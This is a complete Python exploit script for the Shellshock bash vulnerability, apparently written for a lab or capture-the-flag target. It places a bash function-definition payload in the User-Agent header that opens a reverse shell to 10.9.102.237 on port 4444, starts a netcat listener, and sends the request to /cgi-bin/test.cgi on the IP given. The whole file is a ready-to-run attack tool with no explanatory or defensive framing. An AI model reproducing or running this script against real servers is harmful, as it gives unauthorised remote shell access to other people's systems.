#!/usr/bin/python3

import requests, subprocess, time, sys, signal

def def_handler(sig, frame):
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)


if len(sys.argv) < 2:
	print(f"python3 {sys.argv[0]} <ip>")
	sys.exit(0)
else:
	ip_remote = sys.argv[1]
	user_agent = {"User-Agent" : '() { :; }; echo; /bin/bash -c \"bash -i >& /dev/tcp/10.9.102.237/4444 0>&1\"'}

	print("\n[+] SHELLSHOK VULNERABILITY\n")
	print(user_agent)
	print("\n")

	subprocess.Popen(["nc", "-lvnp", "4444"])
	time.sleep(1)
	requests.get(f"http://{ip_remote}/cgi-bin/test.cgi", headers=user_agent)
